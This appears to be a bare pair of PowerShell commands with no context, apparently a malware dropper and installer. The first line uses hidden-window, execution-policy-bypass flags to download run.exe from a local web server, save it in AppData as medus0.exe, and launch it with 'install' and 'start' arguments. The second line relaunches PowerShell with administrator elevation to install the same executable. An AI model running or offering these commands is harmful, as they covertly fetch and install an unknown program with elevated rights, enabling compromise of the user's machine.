powershell -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://localhost:8000/run.exe','$env:APPDATA/medus0.exe');Start-Process '$env:APPDATA/medus0.exe' -ArgumentList 'install';Start-Process '$env:APPDATA/medus0.exe' -ArgumentList 'start';



powershell "start-process powershell -verb runas -ArgumentList 'Start-Process medus0.exe -WorkingDirectory C:\ -ArgumentList install'"